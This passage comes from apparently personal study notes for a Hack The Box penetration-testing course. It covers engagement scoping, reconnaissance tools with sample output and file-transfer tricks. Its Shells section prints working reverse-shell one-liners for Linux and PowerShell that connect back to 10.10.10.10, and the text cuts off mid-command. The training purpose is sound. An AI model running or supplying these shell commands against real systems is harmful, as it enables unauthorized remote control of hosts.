href=#complete-4>Complete</a></li></ul></li><li><a href=#vulnerability-assessment>Vulnerability Assessment</a><ul><li><a href=#vulnerability-scanning>Vulnerability Scanning</a></li><li><a href=#completion>Completion</a></li></ul></li><li><a href=#file-transfers>File transfers</a><ul><li><a href=#astaroth-attack>Astaroth Attack</a></li><li><a href=#living-off-the-land>Living off The Land</a></li><li><a href=#completion-1>Completion</a></li></ul></li><li><a href=#shells-and-payloads>Shells and Payloads</a><ul><li><a href=#bind-shells>Bind Shells</a></li><li><a href=#reverse-shells>Reverse Shells</a></li><li><a href=#laudanum-one-webshell-to-rule-them-all>Laudanum, One Webshell to Rule Them All</a></li><li><a href=#cheatsheet>Cheatsheet</a></li><li><a href=#complete-5>Complete</a></li></ul></li><li><a href=#using-the-metasploit-framework>Using the Metasploit Framework</a><ul><li><a href=#cheatsheet-1>Cheatsheet</a></li><li><a href=#complete-6>Complete</a></li></ul></li><li><a href=#password-attacks>Password attacks</a><ul><li><a href=#credential-storage>Credential storage</a></li><li><a href=#cheatsheet-2>Cheatsheet</a></li><li><a href=#complete-7>Complete</a></li></ul></li><li><a href=#attaking-common-services>Attaking Common Services</a><ul><li><a href=#interacting-with-common-services>Interacting with Common Services</a></li><li><a href=#smb-naming-resolution>SMB Naming Resolution</a></li><li><a href=#mssql-attacks>MSSQL Attacks</a></li><li><a href=#attacking-common-services---easy>Attacking Common Services - Easy</a></li><li><a href=#attacking-common-services---medium>Attacking Common Services - Medium</a></li><li><a href=#attacking-common-services---hard>Attacking Common Services - Hard</a></li><li><a href=#cheatsheet-3>Cheatsheet</a></li><li><a href=#complete-8>Complete</a></li></ul></li><li><a href=#pivoting-tunneling-and-port-forwarding>Pivoting, Tunneling, and Port Forwarding</a><ul><li><a href=#dynamic-port-forwarding-with-ssh-and-socks-tunneling>Dynamic Port Forwarding with SSH and SOCKS Tunneling</a></li><li><a href=#remotereverse-port-fowarding-with-ssh>Remote/Reverse Port Fowarding with SSH</a></li><li><a href=#socat-redirection-with-a-reverse-shell>Socat Redirection with a Reverse Shell</a></li><li><a href=#ssh-pivoting-with-sshuttle>SSH Pivoting with Sshuttle</a></li><li><a href=#dns-tunneling-with-dnscat2>DNS Tunneling with Dnscat2</a></li><li><a href=#socks5-tunneling-with-chisel>SOCKS5 Tunneling with Chisel</a></li><li><a href=#icmp-tunneling-with-socks>ICMP Tunneling with SOCKS</a></li><li><a href=#skill-assessment>Skill Assessment</a></li><li><a href=#cheatsheet-4>Cheatsheet</a></li><li><a href=#completion-2>Completion</a></li></ul></li><li><a href=#active-directory-enumeration--attacks>Active Directory Enumeration & Attacks</a><ul><li><a href=#scenario>Scenario</a></li><li><a href=#external-recon-and-enumeration-principles>External Recon and Enumeration Principles</a></li><li><a href=#initial-enumeration>Initial Enumeration</a></li><li><a href=#llmnrnbt-ns-poisoning>LLMNR/NBT-NS Poisoning</a></li><li><a href=#cheatsheet-5>Cheatsheet</a></li><li><a href=#complete-9>Complete</a></li></ul></li><li><a href=#web-proxies>Web Proxies</a><ul><li><a href=#cheatsheet-6>Cheatsheet</a></li><li><a href=#complete-10>Complete</a></li></ul></li><li><a href=#ffuf>FFuF</a><ul><li><a href=#cheatsheet-7>Cheatsheet</a></li><li><a href=#complete-11>Complete</a></li></ul></li><li><a href=#login-brute-forcing>Login Brute forcing</a><ul><li><a href=#cheatsheet-8>Cheatsheet</a></li><li><a href=#complete-12>Complete</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h2 id=penetration-testing-overview>Penetration Testing Overview<a hidden class=anchor aria-hidden=true href=#penetration-testing-overview>#</a></h2><p>A Penetration Test (Pentest) is an organized, targeted, and authorized attack attempt to test IT infrastructure and its defenders to determine their susceptibility to IT security vulnerabilities.</p><h3 id=precautionary-measures>Precautionary Measures<a hidden class=anchor aria-hidden=true href=#precautionary-measures>#</a></h3><ul><li>Obtain written consent from the owner or authorized representative of the computer or network being tested</li><li>Conduct the testing within the scope of the consent obtained only and respect any limitations specified</li><li>Take measures to prevent causing damage to the systems or networks being tested</li><li>Do not access, use or disclose personal data or any other information obtained during the testing without permission</li><li>Do not intercept electronic communications without the consent of one of the parties to the communication</li><li>Do not conduct testing on systems or networks that are covered by the Health Insurance Portability and Accountability Act (HIPAA) without proper authorization</li></ul><h3 id=pre-engagement-documents>Pre-Engagement Documents<a hidden class=anchor aria-hidden=true href=#pre-engagement-documents>#</a></h3><table><thead><tr><th style=text-align:left>Document</th><th style=text-align:left>Timing for Creation</th></tr></thead><tbody><tr><td style=text-align:left>1. Non-Disclosure Agreement (NDA)</td><td style=text-align:left>After Initial Contact</td></tr><tr><td style=text-align:left>2. Scoping Questionnaire</td><td style=text-align:left>Before the Pre-Engagement Meeting</td></tr><tr><td style=text-align:left>3. Scoping Document</td><td style=text-align:left>During the Pre-Engagement Meeting</td></tr><tr><td style=text-align:left>4. Penetration Testing Proposal (Contract/Scope of Work (SoW))</td><td style=text-align:left>During the Pre-engagement Meeting</td></tr><tr><td style=text-align:left>5. Rules of Engagement (RoE)</td><td style=text-align:left>Before the Kick-Off Meeting</td></tr><tr><td style=text-align:left>6. Contractors Agreement (Physical Assessments)</td><td style=text-align:left>Before the Kick-Off Meeting</td></tr><tr><td style=text-align:left>7. Reports</td><td style=text-align:left>During and after the conducted Penetration Test</td></tr></tbody></table><h3 id=critical-scoping-questions>Critical Scoping Questions<a hidden class=anchor aria-hidden=true href=#critical-scoping-questions>#</a></h3><ul><li>How many expected live hosts?</li><li>How many IPs/CIDR ranges in scope?</li><li>How many Domains/Subdomains are in scope?</li><li>How many wireless SSIDs in scope?</li><li>How many web/mobile applications? If testing is authenticated, how many roles (standard user, admin, etc.)?</li><li>For a phishing assessment, how many users will be targeted? Will the client provide a list, or we will be required to gather this list via OSINT?</li><li>If the client is requesting a Physical Assessment, how many locations? If multiple sites are in-scope, are they geographically dispersed?</li><li>What is the objective of the Red Team Assessment? Are any activities (such as phishing or physical security attacks) out of scope?</li><li>Is a separate Active Directory Security Assessment desired?</li><li>Will network testing be conducted from an anonymous user on the network or a standard domain user?</li><li>Do we need to bypass Network Access Control (NAC)?</li></ul><h3 id=types-of-penetration-testing>Types of Penetration Testing<a hidden class=anchor aria-hidden=true href=#types-of-penetration-testing>#</a></h3><table><thead><tr><th style=text-align:left>Type</th><th style=text-align:left>Information Provided</th></tr></thead><tbody><tr><td style=text-align:left>Blackbox</td><td style=text-align:left>Minimal. Only the essential information, such as IP addresses and domains, is provided.</td></tr><tr><td style=text-align:left>Greybox</td><td style=text-align:left>Extended. In this case, we are provided with additional information, such as specific URLs, hostnames, subnets, and similar.</td></tr><tr><td style=text-align:left>Whitebox</td><td style=text-align:left>Maximum. Here everything is disclosed to us. This gives us an internal view of the entire structure, which allows us to prepare an attack using internal information. We may be given detailed configurations, admin credentials, web application source code, etc.</td></tr><tr><td style=text-align:left>Red-Teaming</td><td style=text-align:left>May include physical testing and social engineering, among other things. Can be combined with any of the above types.</td></tr><tr><td style=text-align:left>Purple-Teaming</td><td style=text-align:left>It can be combined with any of the above types. However, it focuses on working closely with the defenders.</td></tr></tbody></table><h3 id=penetration-testing-stages>Penetration Testing Stages<a hidden class=anchor aria-hidden=true href=#penetration-testing-stages>#</a></h3><p><figure class=image-caption><img alt="Penetration Testing Process" srcset="/posts/htb/pentester/images/pen-process_hu14771742472426855664.webp 480w,
/posts/htb/pentester/images/pen-process_hu5579990561180267833.webp 768w,
/posts/htb/pentester/images/pen-process_hu5142926737633851183.webp 1024w" sizes=100vw src=images/pen-process.png width=768 height=289 loading=lazy><figcaption></figcaption></figure></p><table><thead><tr><th style=text-align:left>Stage</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left>1. Pre-Engagement</td><td style=text-align:left>The first step is to create all the necessary documents in the pre-engagement phase, discuss the assessment objectives, and clarify any questions.</td></tr><tr><td style=text-align:left>2. Information Gathering</td><td style=text-align:left>Once the pre-engagement activities are complete, we investigate the company&rsquo;s existing website we have been assigned to assess. We identify the technologies in use and learn how the web application functions.</td></tr><tr><td style=text-align:left>3. Vulnerability Assessment</td><td style=text-align:left>With this information, we can look for known vulnerabilities and investigate questionable features that may allow for unintended actions.</td></tr><tr><td style=text-align:left>4. Exploitation</td><td style=text-align:left>Once we have found potential vulnerabilities, we prepare our exploit code, tools, and environment and test the webserver for these potential vulnerabilities.</td></tr><tr><td style=text-align:left>5. Post-Exploitation</td><td style=text-align:left>Once we have successfully exploited the target, we jump into information gathering and examine the webserver from the inside. If we find sensitive information during this stage, we try to escalate our privileges (depending on the system and configurations).</td></tr><tr><td style=text-align:left>6. Lateral Movement</td><td style=text-align:left>If other servers and hosts in the internal network are in scope, we then try to move through the network and access other hosts and servers using the information we have gathered.</td></tr><tr><td style=text-align:left>7. Proof-of-Concept</td><td style=text-align:left>We create a proof-of-concept that proves that these vulnerabilities exist and potentially even automate the individual steps that trigger these vulnerabilities.</td></tr><tr><td style=text-align:left>8. Post-Engagement</td><td style=text-align:left>Finally, the documentation is completed and presented to our client as a formal report deliverable. Afterward, we may hold a report walkthrough meeting to clarify anything about our testing or results and provide any needed support to personnel tasked with remediating our findings.</td></tr></tbody></table><h3 id=vulnerability-analysis-types>Vulnerability Analysis Types<a hidden class=anchor aria-hidden=true href=#vulnerability-analysis-types>#</a></h3><table><thead><tr><th style=text-align:left>Analysis Type</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left>Descriptive</td><td style=text-align:left>Descriptive analysis is essential in any data analysis. On the one hand, it describes a data set based on individual characteristics. It helps to detect possible errors in data collection or outliers in the data set.</td></tr><tr><td style=text-align:left>Diagnostic</td><td style=text-align:left>Diagnostic analysis clarifies conditions&rsquo; causes, effects, and interactions. Doing so provides insights that are obtained through correlations and interpretation. We must take a backward-looking view, similar to descriptive analysis, with the subtle difference that we try to find reasons for events and developments.</td></tr><tr><td style=text-align:left>Predictive</td><td style=text-align:left>By evaluating historical and current data, predictive analysis creates a predictive model for future probabilities. Based on the results of descriptive and diagnostic analyses, this method of data analysis makes it possible to identify trends, detect deviations from expected values at an early stage, and predict future occurrences as accurately as possible.</td></tr><tr><td style=text-align:left>Prescriptive</td><td style=text-align:left>Prescriptive analytics aims to narrow down what actions to take to eliminate or prevent a future problem or trigger a specific activity or process.</td></tr></tbody></table><h3 id=common-vulnerabilities-and-exposures-cves-research>Common Vulnerabilities and Exposures (CVEs) Research<a hidden class=anchor aria-hidden=true href=#common-vulnerabilities-and-exposures-cves-research>#</a></h3><ul><li><a href=https://www.cvedetails.com/ title=CVEdetails target=_blank rel="nofollow noopener">CVEdetails</a></li><li><a href=https://www.exploit-db.com/ title="Exploit DB" target=_blank rel="nofollow noopener">Exploit DB</a></li><li><a href=https://vulners.com/ title=Vulners target=_blank rel="nofollow noopener">Vulners</a></li><li><a href=https://packetstormsecurity.com/ title="Packet Storm Security" target=_blank rel="nofollow noopener">Packet Storm Security</a></li><li><a href="https://nvd.nist.gov/vuln/search?execution=e2s1" title=NIST target=_blank rel="nofollow noopener">NIST</a></li></ul><h3 id=practicing-steps>Practicing Steps<a hidden class=anchor aria-hidden=true href=#practicing-steps>#</a></h3><ul><li><p>2x Modules (one technical, one offensive)</p><ol><li>Read the module</li><li>Practice the exercises</li><li>Complete the module</li><li>Start the module exercises from scratch</li><li>While solving the exercises again, take notes</li><li>Create technical documentation based on the notes</li><li>Create non-technical documentation based on the notes</li></ol></li><li><p>3x Retired Machines (two easy, one medium)</p><ol><li><p>Get the user flag on your own</p></li><li><p>Get the root flag on your own</p></li><li><p>Write your technical documentation</p></li><li><p>Write your non-technical documentation</p></li><li><p>Compare your notes with the official write-up (or a community write-up if you don&rsquo;t have a VIP subscription</p></li><li><p>Create a list of information you have missed</p></li><li><p>Watch Ippsec&rsquo;s walkthrough and compare it with your notes</p></li><li><p>Expand your notes and documentation by adding the missed parts</p></li></ol></li><li><p>5x Active Machines (two easy, two medium, one hard)</p><ol><li>Get the user and root flag</li><li>Write your technical documentation</li><li>Write your non-technical documentation</li><li>Have it proofread by technical and non-technical persons</li></ol></li><li><p>1x Pro Lab / Endgame</p></li></ul><h3 id=complete>Complete<a hidden class=anchor aria-hidden=true href=#complete>#</a></h3><p><a href=https://academy.hackthebox.com/achievement/713396/90 title="Link of Completion" target=_blank rel="nofollow noopener">Link of Completion</a></p><p> </p><hr><p> </p><h2 id=getting-started>Getting Started<a hidden class=anchor aria-hidden=true href=#getting-started>#</a></h2><ul><li><code>CIA triad</code>: &ldquo;confidentiality, integrity, and availability of data&rdquo;</li><li>A <code>hypervisor</code> is software that allows us to create and run virtual machines (VMs).</li><li>The <code>ISO</code> file is essentially just a CD-ROM that can be mounted within our hypervisor of choice to build the VM by installing the operating system ourselves. An <code>ISO</code> gives us more room for customization, e.g., keyboard layout, locale, desktop environment switch, custom partitioning, etc., and therefore a more granular approach when setting up our attack VM.</li><li>The <code>OVA</code> file is a pre-built virtual appliance that contains an OVF XML file that specifies the VM hardware settings and a <code>VMDK</code>, which is the virtual disk that the operating system is installed on. An OVA is pre-built and therefore can be rapidly deployed to get up and running quicker.</li><li>A <code>virtual private network (VPN)</code> allows us to connect to a private (internal) network and access hosts and resources as if we were directly connected to the target private network. It is a secured communications channel over shared public networks to connect to a private network (i.e., an employee remotely connecting to their company&rsquo;s corporate network from their home). VPNs provide a degree of privacy and security by encrypting communications over the channel to prevent eavesdropping and access to data traversing the channel.<ul><li><code>netstat -rn</code> will show us the networks accessible via the VPN.</li></ul></li></ul><h3 id=common-ports>Common Ports<a hidden class=anchor aria-hidden=true href=#common-ports>#</a></h3><table><thead><tr><th style=text-align:left>Port(s)</th><th style=text-align:left>Protocol</th></tr></thead><tbody><tr><td style=text-align:left>20/21 (TCP)</td><td style=text-align:left>FTP</td></tr><tr><td style=text-align:left>22 (TCP)</td><td style=text-align:left>SSH</td></tr><tr><td style=text-align:left>23 (TCP)</td><td style=text-align:left>Telnet</td></tr><tr><td style=text-align:left>25 (TCP)</td><td style=text-align:left>SMTP</td></tr><tr><td style=text-align:left>80 (TCP)</td><td style=text-align:left>HTTP</td></tr><tr><td style=text-align:left>161 (TCP/UDP)</td><td style=text-align:left>SNMP</td></tr><tr><td style=text-align:left>389 (TCP/UDP)</td><td style=text-align:left>LDAP</td></tr><tr><td style=text-align:left>443 (TCP)</td><td style=text-align:left>SSL/TLS (HTTPS)</td></tr><tr><td style=text-align:left>445 (TCP)</td><td style=text-align:left>SMB</td></tr><tr><td style=text-align:left>3389 (TCP)</td><td style=text-align:left>RDP</td></tr></tbody></table><h3 id=tools>Tools<a hidden class=anchor aria-hidden=true href=#tools>#</a></h3><ul><li><code>Secure Shell (SSH)</code> is a network protocol that runs on port 22 by default and provides users such as system administrators a secure way to access a computer remotely.</li><li><code>Netcat</code>, <code>ncat</code>, or <code>nc</code>, is an excellent network utility for interacting with TCP/UDP ports. There&rsquo;s another Windows alternative to netcat coded in PowerShell called <a href=https://github.com/besimorhino/powercat title=PowerCat target=_blank rel="nofollow noopener"><code>PowerCat</code></a>.</li><li>Another similar network utility is <a href=https://linux.die.net/man/1/socat title=socat target=_blank rel="nofollow noopener"><code>socat</code></a>, which has a few features that netcat does not support, like forwarding ports and connecting to serial devices. Socat can also be used to upgrade a shell to a <a href=https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method-2-using-socat title="fully interactive TTY" target=_blank rel="nofollow noopener">fully interactive TTY</a>.</li><li>Terminal multiplexers, like <code>tmux</code> or <code>Screen</code>, are great utilities for expanding a standard Linux terminal&rsquo;s features, like having multiple windows within one terminal and jumping between them.</li><li><code>Vim</code> is a great text editor that can be used for writing code or editing text files on Linux systems. -<code>nmap</code> for network enumeration and vulnerability scanning.<ul><li><code>nmap -sV --script=banner -p&lt;port> &lt;host(s)></code> and <code>nc -nv &lt;host> &lt;port></code>can be used for <code>Banner Grabbing</code></li></ul></li><li>A tool that can enumerate and interact with SMB shares is <code>smbclient</code>.</li><li>SNMP Community strings provide information and statistics about a router or device, helping us gain access to it. The manufacturer default community strings of public and private are often unchanged. In SNMP versions 1 and 2c, access is controlled using a plaintext community string, and if we know the name, we can gain access to it. Encryption and authentication were only added in SNMP version 3. Much information can be gained from SNMP. Examination of process parameters might reveal credentials passed on the command line, which might be possible to reuse for other externally accessible services given the prevalence of password reuse in enterprise environments. Routing information, services bound to additional interfaces, and the version of installed software can also be revealed.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>iso.3.6.1.2.1.1.5.0 <span class=o>=</span> STRING: <span class=s2>&#34;gs-svcscan&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ snmpwalk -v 2c -c private  10.129.42.253
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Timeout: No Response from 10.129.42.253
</span></span></code></pre></div><ul><li>A tool such as <a href=https://github.com/trailofbits/onesixtyone title=onesixtyone target=_blank rel="nofollow noopener"><code>onesixtyone</code></a> can be used to brute force the community string names using a dictionary file of common community strings such as the dict.txt file included in the GitHub repo for the tool.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ onesixtyone -c dict.txt 10.129.42.254
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Scanning <span class=m>1</span> hosts, <span class=m>51</span> communities
</span></span><span class=line><span class=cl>10.129.42.254 <span class=o>[</span>public<span class=o>]</span> Linux gs-svcscan 5.4.0-66-generic <span class=c1>#74-Ubuntu SMP Wed Jan 27 22:54:38 UTC 2021 x86_64</span>
</span></span></code></pre></div><ul><li>We can use a tool such as <a href=https://github.com/ffuf/ffuf title=ffuf target=_blank rel="nofollow noopener"><code>ffuf</code></a> or <a href=https://github.com/OJ/gobuster title=GoBuster target=_blank rel="nofollow noopener"><code>GoBuster</code></a> to perform this directory enumeration.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>Gobuster v3.0.1
</span></span><span class=line><span class=cl>by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@_FireFart_<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:            http://10.10.10.121/
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:        <span class=m>10</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:       /usr/share/dirb/wordlists/common.txt
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Status codes:   200,204,301,302,307,401,403
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Agent:     gobuster/3.0.1
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Timeout:        <span class=nv>10s</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2020/12/11 21:47:25 Starting <span class=nv>gobuster</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>/.hta <span class=o>(</span>Status: 403<span class=o>)</span>
</span></span><span class=line><span class=cl>/.htpasswd <span class=o>(</span>Status: 403<span class=o>)</span>
</span></span><span class=line><span class=cl>/.htaccess <span class=o>(</span>Status: 403<span class=o>)</span>
</span></span><span class=line><span class=cl>/index.php <span class=o>(</span>Status: 200<span class=o>)</span>
</span></span><span class=line><span class=cl>/server-status <span class=o>(</span>Status: 403<span class=o>)</span>
</span></span><span class=line><span class=cl>/wordpress <span class=o>(</span>Status: 301<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2020/12/11 21:47:46 <span class=nv>Finished</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span></code></pre></div><ul><li>We can use <code>cURL</code> to retrieve server header information from the command line. <code>cURL</code> can also pull down files.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ curl -IL https://www.inlanefreight.com
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>HTTP/1.1 <span class=m>200</span> OK
</span></span><span class=line><span class=cl>Date: Fri, <span class=m>18</span> Dec <span class=m>2020</span> 22:24:05 GMT
</span></span><span class=line><span class=cl>Server: Apache/2.4.29 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl>Link: &lt;https://www.inlanefreight.com/index.php/wp-json/&gt;<span class=p>;</span> <span class=nv>rel</span><span class=o>=</span><span class=s2>&#34;https://api.w.org/&#34;</span>
</span></span><span class=line><span class=cl>Link: &lt;https://www.inlanefreight.com/&gt;<span class=p>;</span> <span class=nv>rel</span><span class=o>=</span>shortlink
</span></span><span class=line><span class=cl>Content-Type: text/html<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>UTF-8
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=m>100</span>  144k  <span class=m>100</span>  144k    <span class=m>0</span>     <span class=m>0</span>  176k      <span class=m>0</span> --:--:-- --:--:-- --:--:-- 176k
</span></span></code></pre></div><ul><li>Another handy tool is <a href=https://github.com/FortyNorthSecurity/EyeWitness title=EyeWitness target=_blank rel="nofollow noopener"><code>EyeWitness</code></a>, which can be used to take screenshots of target web applications, fingerprint them, and identify possible default credentials.</li><li>We can extract the version of web servers, supporting frameworks, and applications using the command-line tool <code>whatweb</code>.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ whatweb 10.10.10.121
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>http://10.10.10.121 <span class=o>[</span><span class=m>200</span> OK<span class=o>]</span> Apache<span class=o>[</span>2.4.41<span class=o>]</span>, Country<span class=o>[</span>RESERVED<span class=o>][</span>ZZ<span class=o>]</span>, Email<span class=o>[</span>license@php.net<span class=o>]</span>, HTTPServer<span class=o>[</span>Ubuntu Linux<span class=o>][</span>Apache/2.4.41 <span class=o>(</span>Ubuntu<span class=o>)]</span>, IP<span class=o>[</span>10.10.10.121<span class=o>]</span>, Title<span class=o>[</span>PHP 7.4.3 - phpinfo<span class=o>()]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ whatweb --no-errors 10.10.10.0/24
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>http://10.10.10.11 <span class=o>[</span><span class=m>200</span> OK<span class=o>]</span> Country<span class=o>[</span>RESERVED<span class=o>][</span>ZZ<span class=o>]</span>, HTTPServer<span class=o>[</span>nginx/1.14.1<span class=o>]</span>, IP<span class=o>[</span>10.10.10.11<span class=o>]</span>, PoweredBy<span class=o>[</span>Red,nginx<span class=o>]</span>, Title<span class=o>[</span>Test Page <span class=k>for</span> the Nginx HTTP Server on Red Hat Enterprise Linux<span class=o>]</span>, nginx<span class=o>[</span>1.14.1<span class=o>]</span>
</span></span><span class=line><span class=cl>http://10.10.10.100 <span class=o>[</span><span class=m>200</span> OK<span class=o>]</span> Apache<span class=o>[</span>2.4.41<span class=o>]</span>, Country<span class=o>[</span>RESERVED<span class=o>][</span>ZZ<span class=o>]</span>, HTTPServer<span class=o>[</span>Ubuntu Linux<span class=o>][</span>Apache/2.4.41 <span class=o>(</span>Ubuntu<span class=o>)]</span>, IP<span class=o>[</span>10.10.10.100<span class=o>]</span>, Title<span class=o>[</span>File Sharing Service<span class=o>]</span>
</span></span><span class=line><span class=cl>http://10.10.10.121 <span class=o>[</span><span class=m>200</span> OK<span class=o>]</span> Apache<span class=o>[</span>2.4.41<span class=o>]</span>, Country<span class=o>[</span>RESERVED<span class=o>][</span>ZZ<span class=o>]</span>, Email<span class=o>[</span>license@php.net<span class=o>]</span>, HTTPServer<span class=o>[</span>Ubuntu Linux<span class=o>][</span>Apache/2.4.41 <span class=o>(</span>Ubuntu<span class=o>)]</span>, IP<span class=o>[</span>10.10.10.121<span class=o>]</span>, Title<span class=o>[</span>PHP 7.4.3 - phpinfo<span class=o>()]</span>
</span></span><span class=line><span class=cl>http://10.10.10.247 <span class=o>[</span><span class=m>200</span> OK<span class=o>]</span> Bootstrap, Country<span class=o>[</span>RESERVED<span class=o>][</span>ZZ<span class=o>]</span>, Email<span class=o>[</span>contact@cross-fit.htb<span class=o>]</span>, Frame, HTML5, HTTPServer<span class=o>[</span>OpenBSD httpd<span class=o>]</span>, IP<span class=o>[</span>10.10.10.247<span class=o>]</span>, JQuery<span class=o>[</span>3.3.1<span class=o>]</span>, PHP<span class=o>[</span>7.4.12<span class=o>]</span>, Script, Title<span class=o>[</span>Fine Wines<span class=o>]</span>, X-Powered-By<span class=o>[</span>PHP/7.4.12<span class=o>]</span>, X-UA-Compatible<span class=o>[</span><span class=nv>ie</span><span class=o>=</span>edge<span class=o>]</span>
</span></span></code></pre></div><ul><li>One method to transfer files would be using <code>scp</code>, granted we have obtained ssh user credentials on the remote host.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ scp linenum.sh user@remotehost:/tmp/linenum.sh
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>user@remotehost<span class=err>&#39;</span>s password: *********
</span></span><span class=line><span class=cl>linenum.sh
</span></span></code></pre></div><ul><li>In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from downloading a file from our machine. In this type of situation, we can use a simple trick to <code>base64</code> encode the file into <code>base64</code> format, and then we can paste the <code>base64</code> string on the remote server and decode it.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ base64 shell -w <span class=m>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... &lt;SNIP&gt; ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>user@remotehost$ <span class=nb>echo</span> f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... &lt;SNIP&gt; ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU <span class=p>|</span> base64 -d &gt; shell
</span></span></code></pre></div><h3 id=shells>Shells<a hidden class=anchor aria-hidden=true href=#shells>#</a></h3><ul><li>A <code>Reverse Shell</code> is the most common type of shell, as it is the quickest and easiest method to obtain control over a compromised host. <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md title="Payload All The Things" target=_blank rel="nofollow noopener">Payload All The Things</a> has many reverse shell payloads:</li></ul><p><strong>Linux Victim</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>bash -c <span class=s1>&#39;bash -i &gt;&amp; /dev/tcp/10.10.10.10/1234 0&gt;&amp;1&#39;</span>
</span></span><span class=line><span class=cl>...or...
</span></span><span class=line><span class=cl>rm /tmp/f<span class=p>;</span>mkfifo /tmp/f<span class=p>;</span>cat /tmp/f<span class=p>|</span>/bin/sh -i 2&gt;<span class=p>&amp;</span>1<span class=p>|</span>nc 10.10.10.10 <span class=m>1234</span> &gt;/tmp/f
</span></span></code></pre></div><p><strong>Windows Victim</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>powershell</span> <span class=n>-nop</span> <span class=n>-c</span> <span class=s2>&#34;</span><span class=nv>$client</span><span class=s2> = New-Object System.Net.Sockets.TCPClient(&#39;10.10.10.10&#39;,1234);</span><span class=nv>$s</span><span class=s2> = </span><span class=nv>$client</span><span class=s2>.GetStream();[byte[]]</span><span class=nv>$b</span><span class=s2> = 0..65535|%{0};while((</span><span class=nv>$i</span><span class=s2> = </span><span class=nv>$s</span><span class=s2>.Read(</span><span class=nv>$b</span><span class=s2>, 0, </span><span class=nv>$b</span><span class=s2>.Length)) -ne 0){;</span><span class=nv>$data</span><span class=s2> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(</span><span class=nv>$b</span><span class=s2>,0, </span><span class=nv>$i</span><span class=s2>);</span><span class=nv>$sb</span><span class=s2> = (iex </span><span class=nv>$data</span><span class=s2> 2&gt;&amp;1 | Out-String );</span><span class=nv>$sb2</span><span class=s2> = </span><span class=nv>$sb</span><span class=s2> + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;</span><span class=nv>$sbt</span><span class=s2> = ([text.encoding]::ASCII).GetBytes(</span><span class=nv>$sb2</span><span 